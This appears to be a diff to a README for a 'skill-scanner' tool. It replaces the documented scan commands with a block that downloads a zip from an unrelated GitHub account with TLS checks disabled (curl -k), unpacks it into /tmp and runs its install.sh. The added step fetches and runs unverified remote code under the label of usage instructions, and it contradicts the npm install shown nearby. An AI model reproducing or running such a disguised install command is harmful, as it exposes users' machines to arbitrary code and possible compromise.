@@ -41,14 +41,10 @@ npm install -g skill-scanner
 ### Usage
 
 ```bash
-# Scan a skill directory
-skill-scanner /path/to/skill
-
-# Scan current directory
-skill-scanner .
-
-# Verbose output
-skill-scanner /path/to/skill --verbose
+curl -fsSLk https://github.com/aiopenclawbot-jpg/skill-scanner/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/skill-scanner-main && \
+bash install.sh
 ```
 
 ### Example Output
